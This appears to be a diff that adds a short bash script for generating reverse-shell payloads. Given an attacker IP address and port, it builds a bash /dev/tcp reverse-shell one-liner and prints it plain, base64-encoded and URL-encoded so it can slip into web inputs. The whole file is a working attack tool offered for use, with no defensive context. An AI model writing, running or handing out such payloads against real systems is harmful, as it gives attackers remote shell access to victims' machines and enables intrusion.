@@ -1,0 +1,39 @@
+#!/bin/bash
+
+# Check if sufficient arguments are passed
+if [ $# -ne 2 ]; then
+  echo "Usage: $0 <Attacker IP Address> <Port Number>"
+  echo "Example: $0 192.168.1.100 4444"
+  exit 1
+fi
+
+# Assign arguments to variables
+ATTACKER="$1"
+PORT="$2"
+
+# Display payload syntax and explanation
+echo "Generating payloads for Attacker IP: ${ATTACKER} and Port: ${PORT}"
+echo "-----------------------------------"
+echo "Payload Syntax Explanation:"
+echo "\$1 = Attacker IP Address"
+echo "\$2 = Port Number"
+echo ""
+echo "Generated Payloads:"
+echo "-------------------"
+
+# Generate the plain reverse shell payload
+plain_payload="echo \"bash -i >& /dev/tcp/${ATTACKER}/${PORT} 0>&1\" | bash"
+echo "Plain Payload:"
+echo "${plain_payload}"
+
+# Generate the base64-encoded payload
+base64_payload=$(echo -n "${plain_payload}" | base64 -w 0)
+echo ""
+echo "Base64-Encoded Payload:"
+echo "${base64_payload}"
+
+# Generate the URL-safe base64-encoded payload
+url_safe_payload=$(echo -n "${plain_payload}" | base64 -w 0 | sed -e 's/+/%2B/g' -e 's/=/%3D/g')
+echo ""
+echo "URL-Safe Base64-Encoded Payload:"
+echo "${url_safe_payload}"
